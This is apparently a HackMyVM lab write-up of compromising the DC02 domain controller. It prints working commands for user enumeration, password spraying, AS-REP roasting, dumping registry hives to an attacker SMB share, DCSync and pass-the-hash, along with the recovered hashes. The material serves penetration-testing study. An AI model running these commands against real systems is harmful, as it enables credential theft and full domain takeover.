# DC02 — HackMyVM Writeup

**Platform:** HackMyVM  
**OS:** Windows  
**Difficulty:** Medium  
**Author:** Shalopai  
**Techniques:** Kerbrute User Enumeration, Password Spraying, RID Cycling, AS-REP Roasting, Backup Operators Abuse, Registry Dump, Secretsdump, Pass-the-Hash

---

## Summary

DC02 is a Windows Active Directory domain controller with no easy initial foothold — no LLMNR poisoning, no open shares, no null sessions. The attack begins by enumerating valid domain users via Kerbrute, then discovering a weak password through password spraying. With valid credentials, a full user list is obtained via RID cycling, which enables an AS-REP Roasting attack against accounts without Kerberos pre-authentication. The cracked hash gives access to `zximena448`, a member of the Backup Operators group. This privilege is abused to dump the registry hives (SAM/SYSTEM/SECURITY) and extract the machine account hash (`DC01$`), which has DCSync rights — allowing a full domain credential dump. The Administrator hash is then used for Pass-the-Hash access via Evil-WinRM.

## Enumeration

### SMB — No Anonymous Access

```bash
smbclient -L SOUPEDECODE.LOCAL -N
# session setup failed: NT_STATUS_ACCESS_DENIED

netexec smb 192.168.56.126 -u 'guest' -p ''
# STATUS_ACCOUNT_DISABLED
```

Null sessions and guest account are both disabled — no easy way in through SMB.

### User Enumeration via Kerbrute

Since we can't enumerate through SMB, we use **Kerbrute** to identify valid usernames by testing them against the Kerberos service. Kerberos responds differently to valid vs invalid usernames, allowing enumeration without a password.

```bash
./kerbrute userenum -d SOUPEDECODE.LOCAL --dc 192.168.56.126 \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

**Valid users found:**
```
admin@SOUPEDECODE.LOCAL
charlie@SOUPEDECODE.LOCAL
administrator@SOUPEDECODE.LOCAL
```

Non-default users of interest: `charlie` and `admin`.

### Password Spraying

With valid usernames, we test a common weak password pattern — username as password — using `--no-bruteforce` which pairs each user with their own name:

```bash
crackmapexec smb 192.168.56.126 \
  -u users.txt -p users.txt \
  --continue-on-success --no-bruteforce
```

```
[+] SOUPEDECODE.LOCAL\charlie:charlie
```

`charlie` has the password `charlie` — classic weak credential.

### RID Cycling — Full User Enumeration

With valid credentials, we use `impacket-lookupsid` to enumerate all domain accounts by brute-forcing Security Identifier (SID) values. Every AD object has a unique RID; by iterating through them we can map out all users:

```bash
impacket-lookupsid SOUPEDECODE.LOCAL/charlie@192.168.56.126 > usersDC02.txt
```

This reveals 900+ domain users. We extract just the usernames:

```bash
grep '(SidTypeUser)' usersDC02.txt | awk -F'\\\\' '{print $2}' | cut -d' ' -f1 > users.txt
```

## Exploitation — AS-REP Roasting

### What is AS-REP Roasting?

Kerberos normally requires clients to prove their identity before requesting a ticket (pre-authentication). If an account has **"Do not require Kerberos preauthentication"** enabled, the KDC will return an encrypted ticket to anyone who asks — without verifying who they are. This encrypted response contains data encrypted with the user's password hash, which can be cracked offline.

```bash
impacket-GetNPUsers SOUPEDECODE.LOCAL/ -no-pass -usersfile users.txt
```

```
$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:047f8987fb4836299b5f...
```

User `zximena448` has pre-authentication disabled — we get their AS-REP hash.

### Hash Cracking

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
internet    (zximena448)
```

Credentials: `zximena448 : internet`


```
ADMIN$    READ

```

`zximena448` has READ/WRITE on `C$` — this is unusual for a regular user and hints at elevated privileges.

### User Flag

```bash
smbclient //SOUPEDECODE.LOCAL/C$ -U zximena448
smb: \> cd Users\zximena448\Desktop

```

### LDAP Enumeration — Backup Operators

```bash
ldapdomaindump -u 'SOUPEDECODE\zximena448' -p 'internet' 192.168.56.126
firefox domain_users_by_group.html
```

**Critical finding:**

```
Backup Operators:
  zximena448 — NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, DONT_REQ_PREAUTH
```

`zximena448` is a member of **Backup Operators** — a built-in Windows group that grants the ability to back up and restore files, bypassing normal file permissions. This includes the ability to read the registry hives.

## Privilege Escalation — Backup Operators Abuse

### Why Backup Operators is Dangerous

Backup Operators can use the Windows Backup API to read any file on the system, including the registry hives that store password hashes:
- **SAM** — local account hashes
- **SYSTEM** — contains the boot key needed to decrypt SAM
- **SECURITY** — cached domain credentials and machine account secrets

By dumping these files, we can extract the **machine account hash** (`DC01$`), which has replication privileges — allowing a DCSync attack to dump all domain hashes.

### Step 1 — Set Up SMB Server

On the attacker machine, create a share to receive the dumped files:

```bash
mkdir /tmp/smbshare
impacket-smbserver smbshare /tmp/smbshare -smb2support
```

### Step 2 — Dump Registry Hives

```bash
impacket-reg 'SOUPEDECODE.LOCAL/zximena448:internet@192.168.56.126' \
  backup -o //192.168.56.101/smbshare
```

```
[*] Saved HKLM\SAM to //192.168.56.101/smbshare\SAM.save
[*] Saved HKLM\SYSTEM to //192.168.56.101/smbshare\SYSTEM.save
[*] Saved HKLM\SECURITY to //192.168.56.101/smbshare\SECURITY.save
```

### Step 3 — Extract Hashes from Registry Dump

```bash
cd /tmp/smbshare
impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL
```

**Key result:**
```
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:abcfb96846cedd9608b737adc7db2ee4
```

This is the NTLM hash of the **machine account** `DC01$`.

### Step 4 — DCSync Using Machine Account

Machine accounts (`DC01$`) have **DS-Replication-Get-Changes** rights by default — they can replicate directory data from the DC. We use this to dump all domain password hashes:

```bash
impacket-secretsdump 'SOUPEDECODE.LOCAL/DC01$@192.168.56.126' \
  -hashes aad3b435b51404eeaad3b435b51404ee:abcfb96846cedd9608b737adc7db2ee4
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
```

Administrator NTLM hash: `8982babd4da89d33210779a6c5b078bd`

## Attack Chain Summary

1. **Kerbrute** — enumerated valid domain users via Kerberos responses without credentials
2. **Password Spraying** — discovered `charlie:charlie` by testing username=password pattern
3. **RID Cycling** — used charlie's credentials to enumerate all 900+ domain accounts via SID brute-force
4. **AS-REP Roasting** — identified `zximena448` with pre-auth disabled; obtained crackable Kerberos ticket; cracked to `internet`
5. **LDAP Enumeration** — discovered `zximena448` is a member of Backup Operators group
6. **Registry Dump** — abused Backup Operators rights to dump SAM/SYSTEM/SECURITY hives to attacker SMB share
7. **Secretsdump (local)** — extracted machine account hash `DC01$` from registry dump
8. **DCSync** — authenticated as `DC01$` to replicate all domain credentials including Administrator hash
9. **Pass-the-Hash** — Evil-WinRM with Administrator hash gave full DC access

## Lessons Learned

- **Kerbrute is powerful without credentials.** When null sessions and guest accounts are disabled, Kerberos user enumeration is often still possible since the KDC responds differently to valid vs invalid usernames.
- **Password spraying beats brute force.** Testing username=password for every account is low-noise and highly effective — `charlie:charlie` is embarrassingly common in real environments.
- **AS-REP Roasting is easy to miss.** Accounts with pre-auth disabled are often service accounts or legacy configurations that admins forget about. Always run GetNPUsers against a full user list.
- **Backup Operators is severely underestimated.** Most admins think of it as "just backup access" — but it grants registry read access including the SAM hive, which leads directly to domain compromise.
- **Machine accounts have DCSync rights.** `DC01$` can replicate domain credentials by design — this is legitimate functionality that attackers abuse when they get the machine account hash.
- **The full attack chain here required zero exploits** — only misconfigurations: weak password, disabled pre-auth, and excessive group membership.
